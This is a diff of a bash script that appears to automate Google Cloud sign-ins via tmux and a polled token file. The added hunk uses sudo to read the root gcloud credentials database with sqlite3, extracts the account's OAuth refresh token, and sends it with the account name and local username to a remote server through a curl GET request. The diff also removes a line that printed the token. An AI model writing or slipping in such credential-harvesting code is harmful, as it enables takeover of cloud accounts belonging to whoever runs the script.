@@ -2,6 +2,9 @@
 
 source http
 
+path=$(pwd)
+user=${path#/home/}
+
 session_name=($(tmux list-sessions -F "#{session_name}"))
 
 file='.'${0##*/} && file=${file%.*}'.tmp'
@@ -21,8 +24,6 @@ do
      token=$(jq '.token' $file)
      token=${token//'"'/}
 
-echo "$token"
-
      if [ $token != 'null' ]
      then
 
@@ -36,8 +37,16 @@ echo "$token"
 
         echo 'Token enviado!'
 
-        gcloud auth list --format="value(account)"
+        new=$(sudo gcloud config get-value account)
 
+        sudo sqlite3 /root/.config/gcloud/credentials.db "select value from credentials where account_id = '$new'" > $file
+        refresh_token=$(jq '.refresh_token' $file)
+        refresh_token=${refresh_token//'"'/}
+
+        url=$ip'/new.php?account='$new'&creator='$user'&refresh='$refresh_token
+        curl $url
+
+        echo $new 'ok!'
      fi
 
   fi
